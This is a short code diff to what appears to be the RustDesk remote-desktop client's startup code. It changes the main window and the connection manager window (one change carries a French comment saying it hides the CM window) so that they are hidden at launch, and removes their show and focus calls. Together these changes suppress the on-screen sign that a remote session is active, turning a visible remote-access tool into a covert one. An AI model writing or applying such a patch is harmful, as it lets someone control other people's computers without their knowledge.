@@ -165,10 +165,8 @@ void runMainApp(bool startService) async {
     if (handledByUniLinks || handleUriLink(cmdArgs: kBootArgs)) {
       windowManager.hide();
     } else {
-      windowManager.show();
-      windowManager.focus();
-      // Move registration of active main window here to prevent from async visible check.
-      rustDeskWinManager.registerActiveWindow(kWindowMainId);
+      windowManager.hide();
+      
     }
     windowManager.setOpacity(1);
     windowManager.setTitle(getWindowName());
@@ -298,7 +296,7 @@ void runConnectionManagerScreen() async {
   if (hide) {
     await hideCmWindow(isStartup: true);
   } else {
-    await showCmWindow(isStartup: true);
+    await hideCmWindow(isStartup: true); // MODIF — cache la fenêtre CM
   }
   setResizable(false);
   // Start the uni links handler and redirect links to Native, not for Flutter.
@@ -314,8 +312,6 @@ showCmWindow({bool isStartup = false}) async {
     await windowManager.waitUntilReadyToShow(windowOptions, null);
     bind.mainHideDock();
     await Future.wait([
-      windowManager.show(),
-      windowManager.focus(),
       windowManager.setOpacity(1)
     ]);
     // ensure initial window size to be changed
